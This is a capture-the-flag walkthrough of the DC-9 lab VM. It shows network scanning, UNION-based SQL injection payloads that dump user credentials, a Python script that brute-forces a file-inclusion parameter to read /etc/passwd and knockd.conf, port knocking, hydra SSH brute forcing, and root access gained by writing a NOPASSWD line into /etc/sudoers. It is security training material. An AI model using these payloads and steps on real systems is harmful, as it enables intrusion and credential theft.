## Information Gathering
### Host Dicovery
We start by discovering the target host on the local network, for this we will use arp-scan as shown below:

``` bash
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24 
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.128 00:0c:29:0f:98:6d       VMware, Inc.
...
```

### Port Scanning
Ones the target is discovered, we proceed to scan all TCP ports with nmap, to detect possible open ports.

``` bash
root@kali:~$ nmap -n -T5 -p1-65535 -v 192.168.179.128  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 13:17 -05
...
Host is up (0.0026s latency).
Not shown: 65533 closed ports
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 00:0C:29:0F:98:6D (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```
In the output we can see that port 22 SSH is filtered, it is possible that certain firewall rules may be blocking incoming traffic, the only port that's open is 80 HTTP.

### Service Enumeration

For obtain more information on the open port, we do an aggressive scan, this scan enables operating system detection, version scanning, script scanning and traceroute.

``` bash
root@kali:~$ nmap -n -A -p80 -v 192.168.179.128
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 13:32 -05
...
PORT   STATE    SERVICE VERSION
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

Uptime guess: 42.715 days (since Wed Apr 21 20:32:35 2021)
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```

The result obtained indicates that port 80 is running Apache httpd 2.4.38, the possible operating system is debian and the supported methods.

### Web Browser Enumeration
Browsing the web application in the **Display All Records** tab, users with personal information are listed, in the **Search** tab there's a search box that retrieves users by name or surname, is possible that'is records are stored in a database and we try to test for SQL injection vulnerability, after several manual tests it could be detect that the web applicacion is vulnerable to SQL injection, as shown below:

![](/assets/images/DC-9/screenshot-1.png)

In the web application we can see that the all records are listed.

## Exploitation
### SQL Injection
**Column Number Enumeration**

Detected the vulnerability, I proceed to find the number of columns using the **order by** clause wich tries to sort the columns of the **SELECT** query, I started by sorting the first column and incrementing the value by one to the seventh column that does not produce any results, letting me to know that there're six columns.

``` bash
Mary' order by 1 #
...
Mary' order by 6 #
```

**Understanding the layout of the output**

Our next step is know if the parameters are printable on the vulnerable web application, for this we use the following query:
``` bash
Mary' and 1=2 union select 1,2,3,4,5,6 #
```
In the output it can be seen that all the injected parameters are displayed on the screen.

![](/assets/images/DC-9/screenshot-3.png)

**Extracting data from the Database**

We started discovering the current database that's using the web application, the current version of MySQL and the user being used for the database connection.

``` bash
Mary' and 1=2 union select database(),@@version,null,user(),null,null #
```

![](/assets/images/DC-9/screenshot-4.png)

After we enumerate the available databases with the following statement:

``` bash
Mary' and 1=2 union select schema_name,null,null,null,null,null from information_schema.schemata #
```

![](/assets/images/DC-9/screenshot-5.png)

We can see the **Staff** database that belongs to the web aplication and another one called **users**, at this moment we will try to list the names of the tables of the **Staff** schema.

``` bash
Mary' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema=database() #
```

![](/assets/images/DC-9/screenshot-6.png)

In the output we see that there are two tables, let's list the columns of the **Users** table which is the one that most catches our attention.

``` bash
Mary' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema=database() and table_name='Users' #
```

![](/assets/images/DC-9/screenshot-7.png)

At this point I'm going to intercept the request with burpsuite to later make the request with curl and filter the data with regular expressions, in this way I have the credentials stored in a file on my machine.

``` bash
Mary' and 1=2 union select concat(Username,0x3a,Password),null,null,null,null,null from Users #
```

![](/assets/images/DC-9/screenshot-8.png)

``` bash
root@kali:~$ curl -s -X POST "http://192.168.179.128/results.php" --data "search=Mary%27+and+1%3D2++union+select+concat%28Username%2C0x3a%2CPassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+Users+%23" | grep -oP "\w*:\S{32}" > users_staff
root@kali:~$ cat users_staff
admin:856f5de590ef37314e7c3bdf6f8a66dc
```

In the result it can be seen that there's only one record. Let's try to crack this password hash in [hashes.com](https://hashes.com). 

![](/assets/images/DC-9/screenshot-9.png)

As you can see, the password for this hash is **transorbital1**

**users database**

Now let's try to find out what interesting information may exist in the **users** schema, for this we start by listing the tables.

``` bash 
Mary' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema='users' #
```

![](/assets/images/DC-9/screenshot-10.png)

We have found the table **UserDetails**, let's list their respective columns.

``` bash
Mary' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema='users' and table_name='UserDetails' #
```

![](/assets/images/DC-9/screenshot-11.png)

In the output we see two important fields username and password, in the same way we intercept the request with burp and then create the request with curl and filter the data with regular expressions.

``` bash
Mary' and 1=2 union select concat(username,0x3a,password),null,null,null,null,null from users.UserDetails #
```

![](/assets/images/DC-9/screenshot-12.png)

``` bash
root@kali:~$ curl -s -X POST "http://192.168.179.128/results.php" --data "search=Mary%27++and+1%3D2+union+select+concat%28username%2C0x3a%2Cpassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+users.UserDetails+%23" | grep -oP "\w*:\S[^<]*" > UserDetails
root@kali:~$ cat UserDetails
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

It can be seen that a list of users with their respective passwords were obtained in plain text. 
### Local File Inclusion 

Later with the credentials **admin:transorbital1** we log in to the web application and we find a message at the bottom "File does not exist". 

![](/assets/images/DC-9/screenshot-13.png)

It is possible that a certain parameter is being called and requires include a specific file, but we do not know the parameter name, it is also possible that there's a Local File Inclusion vulnerability, in that case I developed a python script to brute force with a list of common parameters and including the web server passwd file how value, this dictionary can be found in seclists. 

``` bash
#!/usr/bin/python3 

import requests
from colorama import Fore,init

init()
green=Fore.GREEN
gray=Fore.LIGHTBLACK_EX
reset=Fore.RESET

s=requests.session()

def paramenum(p):
    values={
            'username':'admin',
            'password':'transorbital1'
            }

    req=s.post("http://192.168.179.128/manage.php", data=values)
    req=s.get(f"http://192.168.179.128/manage.php?{p}=../../../../../../etc/passwd")
    return len(req.text)

wordlist=open("/opt/seclists/Discovery/Web-Content/burp-parameter-names.txt").read().splitlines()

if __name__=="__main__":
    for parameter in wordlist:
        x=paramenum(parameter)
        if x != 1341:
            print(f"{green}{parameter:20}=> {x}{reset}")
        else:
            print(f"{gray}{parameter:20}=> {x}{reset}")

```

A moment after running the script, it can be seen that in the **file** parameter the size of the server's response is different.

``` bash
root@kali:~$ python3 lfi.py
id                  => 1341
...
file                => 3694
...
code                => 1341
```

I proceed to verify and you can see that the content of the passwd file is displayed on the web application, this means that exist a Local File Inclusion vulnerability.

![](/assets/images/DC-9/screenshot-14.png)

If we remember the port 22 is filtered, something is blocking the incoming traffic to that port, in certain cases a mechanism known as **Port knocking** is usually implemented as a security mechanism that allows open a port by attempting to connect to a series of ports closed. After googling I find that the configuration file is in **/etc/knokd.conf** and we try to see the content of this file, for this I have used curl as shown below:

``` bash
root@kali:~$ curl -s -L -X POST "http://192.168.179.128/manage.php" -c cookiefile --data "username=admin&password=transorbital1"
root@kali:~$ curl -s "http://192.168.179.128/manage.php?file=../../../../../../etc/knockd.conf" -b cookiefile | grep -vP '[>]\B' | sed "s/^\s.*[>]//g; 1,9d"
        UseSyslog

[openSSH]
        sequence    = 7469,8475,9842
        seq_timeout = 25
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9842,8475,7469
        seq_timeout = 25
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

```

In the output we see a sequence of ports that we have to connect to open port 22 and the same way there's a secuence of ports to close it. I developed a bash oneliner that tries to connect to the ports **7469 8475 9842**, and we can verify that the SSH service is enabled.

``` bash
root@kali:~$ for port in 7469 8475 9842; do nc 192.168.179.128 $port; done
(UNKNOWN) [192.168.179.128] 7469 (?) : Connection refused
(UNKNOWN) [192.168.179.128] 8475 (?) : Connection refused
(UNKNOWN) [192.168.179.128] 9842 (?) : Connection refused
root@kali:~$  nc 192.168.179.128 22
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
```

### Access via SSH
Then we try to verify if the credentials found allow us to have access via SSH, for this I used hydra.

``` bash
root@kali:~$ hydra -C UserDetails ssh://192.168.179.128 
...
[DATA] attacking ssh://192.168.179.128:22/
[22][ssh] host: 192.168.179.128   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.179.128   login: joeyt       password: Passw0rd
[22][ssh] host: 192.168.179.128   login: janitor     password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
```

Three valid credentials were found, of which accessing as the user **janitor** I found the directory **.secrets-for-putin** with a file containing a list of passwords.

``` bash
root@kali:~$ ssh -l janitor 192.168.179.128
janitor@192.168.179.128's password: 
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

This passwords are stored in the file **ssh_passwords** on the attacking machine, and we filter the usernames of the **UserDetails** file to store them in another file named **ssh_users**.

``` bash
root@kali:~$ cat ssh_passwords
BamBam01 
Passw0rd 
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
root@kali:~$ cut -d ":" -f 1 UserDetails > ssh_users
root@kali:~$ cat ssh_users
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

Then I made a brute force attack with hydra, where two valid users were found.

``` bash
root@kali:~$ hydra -L ssh_users -P ssh_passwords ssh://192.168.179.128
...
[DATA] attacking ssh://192.168.179.128:22/
[22][ssh] host: 192.168.179.128   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.179.128   login: joeyt   password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
```

## Privilege Escalation
### Sudo Permissions

We access via SSH with the credentials **fredf:B4-Tru3-001** we verify the sudo privileges and we found that it has permissions to execute a script without providing a password.

``` bash
root@kali:~$ ssh -l fredf 192.168.179.128                      
fredf@192.168.179.128's password: 
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

This script reads a file and adds the content to a file, to obtain root we create the **sudo_perm** file assigning sudo permissions to the user **fredf** to run any command without providing a password, then we execute the script as parameters the **sudo_perm** and **sudoers** files, and we get root.

``` bash
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test 
Usage: python test.py read append
fredf@dc-9:~$ echo "fredf ALL=(ALL) NOPASSWD:ALL" > sudo_perm
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test sudo_perm /etc/sudoers
fredf@dc-9:~$ sudo su
root@dc-9:/home/fredf# id
uid=0(root) gid=0(root) groups=0(root)
```
